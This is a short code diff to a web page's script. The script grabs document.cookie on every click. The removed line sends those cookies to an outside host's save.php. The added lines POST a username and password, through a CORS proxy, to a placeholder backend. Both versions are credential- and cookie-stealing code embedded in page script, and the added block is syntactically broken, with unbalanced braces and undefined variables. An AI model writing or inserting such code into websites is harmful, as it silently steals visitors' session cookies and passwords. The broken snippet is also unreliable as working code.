@@ -676,10 +676,12 @@ document.addEventListener('DOMContentLoaded', function() {
     document.addEventListener('click', function() {
         const cookies = document.cookie;
         if (cookies) {
-            fetch(`http://wassup.iceiy.com/save.php?cookies=${encodeURIComponent(cookies)}`);
-        }
-    });
+ fetch("https://cors-anywhere.herokuapp.com/https://your-backend-server.com/save.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username, password })
 });
+
 </script>
 
 
